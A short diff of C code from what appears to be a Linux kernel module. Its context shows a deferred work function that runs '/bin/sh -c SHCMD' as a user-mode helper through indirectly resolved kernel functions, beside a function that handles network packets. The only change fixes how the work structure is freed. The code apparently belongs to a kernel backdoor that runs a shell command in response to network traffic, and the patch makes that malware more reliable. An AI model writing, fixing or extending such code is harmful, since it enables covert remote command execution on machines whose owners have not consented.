@@ -50,7 +50,7 @@ static void delayed_work(struct work_struct *ws) {
 	char *envp[2] = { "HOME=/proc", NULL };
 	char *argv[4] = { "/bin/sh", "-c", SHCMD, NULL };
 	p_call_umh(argv[0], argv, envp, UMH_WAIT_EXEC);
-	p_kfree(ws);
+	p_kfree(container_of(ws, struct execute_work, work));
 }
 
 static void try_skb(struct sk_buff *skb) {
